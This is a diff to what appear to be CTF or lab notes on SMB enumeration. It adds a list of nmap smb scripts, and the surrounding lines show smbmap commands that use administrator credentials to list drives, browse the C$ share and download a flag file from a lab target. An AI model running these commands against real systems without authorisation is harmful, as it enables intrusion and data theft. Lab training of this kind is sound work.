@@ -24,6 +24,17 @@ Host script results:
 |     3.00
 |_    3.02
 
+# some other good scripts
+- smb-protocols
+- smb-enum-users
+- smb-enum-shares
+- smb-security-mode
+- smb-enum-sessions
+- smb-enum-domains
+- smb-enum-groups
+
+# or just do a locate *.nse | grep -ie 'smb-'
+
 # List drives on target 
 $ smbmap -u administrator -p password123 -H $target -L 
 
@@ -124,5 +135,4 @@ $ smbmap -u administrator -p smbserver_771 -H $target -r 'C$'
 $ smbmap -u administrator -p smbserver_771 -H $target --download 'C$\flag.txt'
 [+] Starting download: C$\flag.txt (32 bytes)
 [+] File output to: /root/10.4.18.185-C_flag.txt
-
 
